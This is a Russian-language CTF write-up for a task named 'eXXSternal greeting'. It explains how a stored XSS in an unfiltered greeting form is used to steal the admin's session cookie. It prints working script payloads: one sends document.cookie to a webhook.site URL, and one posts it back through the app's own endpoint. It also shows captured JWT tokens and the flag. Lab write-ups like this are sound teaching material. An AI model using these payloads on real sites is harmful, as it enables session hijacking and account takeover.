# eXXSternal greeting

## Исследование

Название задачи намекает на XSS.

В самой задаче для начала необходимо залогиниться (зарегистрироваться).

После логина можно заметить, что рядом с логином написано `Admin: false`.

Также на главной странице в комментарии есть текст `<!-- админ: не админ; сервис с поздравлениями я дам, флаг я не дам -->`

Есть страничка с отображением списка зарегистрированных пользователей - т.к. таск поднимался индивидуально, там обычно было только два человека - это `admin` и свежезареганный юзер.

Есть форма, через которую можно отправить кому-либо поздравление, есть страница, на которой отображаются отправленные и полученные поздравления.

Если посмотреть в куки / запросы, можно увидеть, что после логина ставится кука вида `access_token="Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJleHAiOjE3MjUzNzUzNTR9.xixPfnQa8al9BzUvFj3XHNGAy2KmAzi26uYYuBuyHIw"`

Это обычная JWT, её ломать не нужно ;)

Также, если просто потыкать формочку поздравлений, нужно увидеть, что никакой фильтрации там нет, и всё, что через неё проходит появляется на странице поздравлений as is.

Исходя из доступных возможностей взаимодействия с таском, логичным выглядит следующий способ эксплуатации: отправить что-то админу, чтобы получить его куку или какие-то его данные.

## Эксплуатация

Для начала надо получить куку админа.

Есть два пути: использовать какой-то сторонний ресурс для отстуков, или сделать всё исключительно с помощью таска.

### Первый путь

Я обычно использую <https://webhook.site> для таких задач.

Самое простое решение тут вот такое:

```js
<script>
    fetch('https://webhook.site/89ac9485-c571-42e1-94a1-311f98467f9a', { method: 'POST', body: JSON.stringify(document.cookie)}) 
</script>
```

Отправляем поздравление, ждем отстук, получаем куку админа (`Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzI1Mzc5NzkxfQ.H7s9Ytgkxj88UbxRDgI9iPR6smnsv_cYBzjluwfIJxQ`)

Открываем главную страницу, и там в HTML-комментарии забираем флаг.

### Второй путь

Тут была небольшая сложность: если пытаться сходить по айпишнику таска, это не работало: надо было использовать либо относительные ссылки, либо догадаться до использования домена `task`.

```js
<script>
    let formData = new FormData();
    formData.append('username', 'test');
    formData.append('congr', document.cookie);
    fetch('/congr', { method: 'POST', body: formData})
</script>
```

Отправляем, получаем куку в поздравлении:

![pic](./pic1.jpg)

Ещё вместо куки можно было грепать и отправлять себе сразу флаг, но это упражнение с JS'ом остается на усмотрение читателя ;)

## Флаг

`crab{f3l1c1t4t10n_4nd_h4ppy_n3w_y34r_f0r_b0ss_*}`
